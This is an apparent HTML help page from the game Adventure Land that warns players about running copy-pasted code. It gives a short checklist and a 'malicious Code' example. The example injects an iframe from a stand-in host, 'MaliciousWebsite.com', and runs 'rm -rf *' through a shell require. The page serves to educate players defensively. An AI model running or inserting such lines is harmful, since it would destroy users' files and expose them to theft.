<p>[Security First!]</p>

<p>In our daily lives, we run codes, programs, games - all from different resources. And we assume these will be safe, and others will make sure they are safe.</p>

<p>You have no other choice, as you can't see or inspect everything your computer runs.</p>

<p>However on Adventure Land you have the chance to quickly glance at every line of a Code you'll copy-paste from a fellow player, and <span style='color:#EB632B'>you must!</span></p>

<p>Doesn't matter if you are a Coder or not, it's usually easy to spot malicious Code!</p>

<p>Here's a quick Checklist:</p>

<pre style='font-family: Pixel; font-size: 32px'>
	1. Make sure there are no external links inside the Code
	2. Make sure the Code is simple, understandable
	3. Make sure the Code doesn't have anything funky
	4. If you are not sure, ask someone you trust to make sure
</pre>

<p>If you can't be sure, you <span style='color:#EB4C42'>must-not!</span> copy-paste Code from someone else, and run it!</p>

<p>One example of a bad / malicious Code:</p>

<div class='code'>
parent.$("body").append("<iframe src='MaliciousWebsite.com' />");
// Injects a malicious website, to steal your items, and who knows what else?!
require("shell").execute("rm -rf *");
// Uses ->require<- in the game client to get higher Node access - to delete everything it can find!
</div>

<p>Codes you copy-paste, should be as simple to you as:</p>

<div class='code'>
setInterval(function(){
	heal(get_player("Wizard"));
	// It's easy to understand that this is a basic interval that tries to heal Wizard every 5 seconds
},5000);
</div>

{#<p>With a game, it's easy to ensure security, but as a friendly advice, keep in mind that we live in a bad world, with bad people, so make sure these people don't have anything on a good person like you, even if the worst case scenario happens, where they get access to all your personal files...</p> (probably too real for a game) #}
